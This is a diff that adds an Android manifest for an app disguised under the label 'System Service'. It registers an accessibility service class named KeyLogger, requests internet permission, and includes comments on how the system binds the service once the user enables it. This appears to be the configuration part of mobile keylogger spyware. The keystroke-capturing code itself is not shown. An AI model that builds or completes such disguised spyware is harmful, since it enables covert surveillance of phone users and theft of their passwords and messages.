@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- BIND_ACCESSIBILITY_SERVICE is granted implicitly by the system when the user
+         enables the service in Settings; it must not be requested as a normal permission. -->
+
+    <application
+        android:allowBackup="false"
+        android:label="System Service"
+        android:supportsRtl="true">
+
+        <!-- exported=false: the service can only be started by the system. The system still
+             binds it because the user explicitly enables it under Settings > Accessibility. -->
+        <service
+            android:name=".KeyLogger"
+            android:exported="false"
+            android:label="System Service"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+    </application>
+</manifest>
